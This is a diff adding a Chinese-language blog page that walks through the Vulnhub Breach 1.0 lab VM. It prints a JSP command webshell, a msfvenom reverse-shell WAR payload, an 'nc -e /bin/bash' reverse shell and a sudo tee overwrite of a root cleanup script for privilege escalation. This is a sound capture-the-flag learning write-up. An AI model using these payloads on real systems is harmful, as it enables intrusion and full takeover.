@@ -1,0 +1,255 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Vulnhub Breach 1.0 - H3ppo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ppo,"> 
+    <meta name="description" content="环境下载https://download.vulnhub.com/breach/Breach-1.0.zip
+环境搭建vmware导入下载解压后的ova文件
+设置host-only模式，设置ip 1,"> 
+    <meta name="author" content="H3ppo"> 
+    <link rel="alternative" href="/atom.xml" title="H3ppo" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ppo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://H3ppo.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Vulnhub Breach 1.0</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Vulnhub Breach 1.0</h1>
+        <div class="stuff">
+            <span>九月 20, 2022</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h3 id="环境下载"><a href="#环境下载" class="headerlink" title="环境下载"></a>环境下载</h3><p><a target="_blank" rel="noopener" href="https://download.vulnhub.com/breach/Breach-1.0.zip">https://download.vulnhub.com/breach/Breach-1.0.zip</a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>vmware导入下载解压后的ova文件</p>
+<p>设置host-only模式，设置ip 192.168.110.0（breach静态地址192.168.110.140）</p>
+<p>![image-20220921000956643](Vulnhub Breach 1.0.assets/image-20220921000956643.png)</p>
+<ul>
+<li>攻击机IP：192.168.110.128</li>
+<li>靶机IP：192.168.110.140</li>
+</ul>
+<h3 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h3><p>开启breach</p>
+<p>![image-20220921001107489](Vulnhub Breach 1.0.assets/image-20220921001107489.png)</p>
+<p>访问192.168.110.140web服务</p>
+<p>![image-20220921001314088](Vulnhub Breach 1.0.assets/image-20220921001314088.png)</p>
+<p>f12中发现base64字符串 解密后<code>pgibbons:damnitfeel$goodtobeagang$ta</code></p>
+<p>后台登录发现第三封邮件存在一份ssl证书<code>192.168.110.140/.keystore</code></p>
+<pre><code>http://192.168.110.140/impresscms/readpmsg.php?start=0&amp;total_messages=3</code></pre>
+<p>![image-20220920162607332](Vulnhub Breach 1.0.assets/image-20220920162607332.png)</p>
+<p>发现一个流量包</p>
+<pre><code>http://192.168.110.140/impresscms/modules/content/content.php?content_id=1</code></pre>
+<p>![image-20220920162617863](Vulnhub Breach 1.0.assets/image-20220920162617863.png)</p>
+<ul>
+<li><code>_SSL_test_phase1.pcap</code>一个流量包，此流量包为黑客留下。</li>
+</ul>
+<p>jdk/bin目录下的keytool.exe可以用来查看和导入证书</p>
+<p>![image-20220920171559066](Vulnhub Breach 1.0.assets/image-20220920171559066.png)</p>
+<p>导出该证书，重命名为：<code>keystore.p12</code>（<code>.p12</code>它是保存私钥和证书的组合格式，是最新的签名实用程序使用的格式）</p>
+<p>![image-20220920171541856](Vulnhub Breach 1.0.assets/image-20220920171541856.png)</p>
+<p>![image-20220920171531050](Vulnhub Breach 1.0.assets/image-20220920171531050.png)</p>
+<p><code>wireshark-&gt;编辑-&gt;首选项-&gt;Protocols-&gt;TLS</code>添加此p12证书</p>
+<p>![image-20220920170128933](Vulnhub Breach 1.0.assets/image-20220920170128933.png)</p>
+<p>导入后发现之前加密后的部分TLS变成了HTTP</p>
+<p>![image-20220921002500753](Vulnhub Breach 1.0.assets/image-20220921002500753.png)</p>
+<p>发现一个命令执行的包，两个疑似图片马，还有一个Unauthorized认证包</p>
+<pre><code>https://192.168.110.140:8443/_M@nag3Me/html</code></pre>
+<p>![image-20220921002842058](Vulnhub Breach 1.0.assets/image-20220921002842058.png)</p>
+<p>basic加密的账号密码</p>
+<p>![image-20220921003003606](Vulnhub Breach 1.0.assets/image-20220921003003606.png)</p>
+<p>登录后台</p>
+<p>![image-20220921003042121](Vulnhub Breach 1.0.assets/image-20220921003042121.png)</p>
+<p>常规上传jsp马生成成war包，发现会被删除</p>
+<pre class=" language-jsp"><code class="language-jsp"><%
+    if("000".equals(request.getParameter("a"))){
+        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
+        int a = -1;
+        byte[] b = new byte[2048];
+        out.print("<pre>");
+        while((a=in.read(b))!=-1){
+            out.println(new String(b));
+        }
+        out.print("</pre>");
+    }
+%></code></pre>
+<p>只能采用msf生成的war进行反弹shell</p>
+<pre><code>msfvenom -p java/meterpreter/reverse_tcp lhost=192.168.110.128 lport=1234 -f war -o shell.war</code></pre>
+<p>![image-20220921003520314](Vulnhub Breach 1.0.assets/image-20220921003520314.png)</p>
+<p>设置参数</p>
+<pre><code>set LHOST 192.168.110.128
+set LPORT 1234</code></pre>
+<p>访问<a target="_blank" rel="noopener" href="https://192.168.110.140:8443/shell/%EF%BC%8C%E6%88%90%E5%8A%9F%E5%8F%8D%E5%BC%B9shell">https://192.168.110.140:8443/shell/，成功反弹shell</a></p>
+<p>将shell升级为 tty，得到一个交互式的shell：</p>
+<pre><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+<p>![image-20220921003735683](Vulnhub Breach 1.0.assets/image-20220921003735683.png)</p>
+<p>在/etc/passwd中发现两个用户</p>
+<p>发现数据库连接文件</p>
+<p>![image-20220921004027920](Vulnhub Breach 1.0.assets/image-20220921004027920.png)</p>
+<p>发现milton解密后的密码thelaststraw</p>
+<p>![image-20220921004054916](Vulnhub Breach 1.0.assets/image-20220921004054916.png)</p>
+<p>登录后发现不属于sudo组</p>
+<p>![image-20220921004226756](Vulnhub Breach 1.0.assets/image-20220921004226756.png)</p>
+<p>历史命令发现blumbergh可能有root权限</p>
+<p>![image-20220921004305363](Vulnhub Breach 1.0.assets/image-20220921004305363.png)</p>
+<p>bill.png中找到了密码：<code>coffeestains</code></p>
+<p>能够以root权限执行这tee程序和tidyup.sh脚本：<code>/usr/bin/tee</code>和<code>/usr/share/cleanup/tidyup.sh</code>，其中tee命令用于读取标准输入的数据，并将其内容输出成文件，tidyup.sh是清理脚本</p>
+<p>![image-20220921004425743](Vulnhub Breach 1.0.assets/image-20220921004425743.png)</p>
+<ul>
+<li><p>向tidyup.sh中写入反弹shell命令，由于能够以root权限运行tee命令，即可以用tee命令写tidyup.sh</p>
+</li>
+<li><p>先将反弹shell命令写入shell.txt文件，使用bash反弹shell命令没有成功，于是使用nc命令反弹shell成功，所以写nc反弹命令：echo “nc -e /bin/bash 192.168.110.128 4321” &gt; shell.txt</p>
+</li>
+<li><p>再使用tee命令将shell.txt内容输出到tidyup.sh：cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</p>
+</li>
+</ul>
+<p>![image-20220921004548670](Vulnhub Breach 1.0.assets/image-20220921004548670.png)</p>
+<p>起一个监听成功反弹shell![image-20220921004640558](Vulnhub Breach 1.0.assets/image-20220921004640558.png)</p>
+<p>root权限，提权结束</p>
+<p>![image-20220921004718401](Vulnhub Breach 1.0.assets/image-20220921004718401.png)</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.</span> <span class="toc-text">环境下载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">渗透测试</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
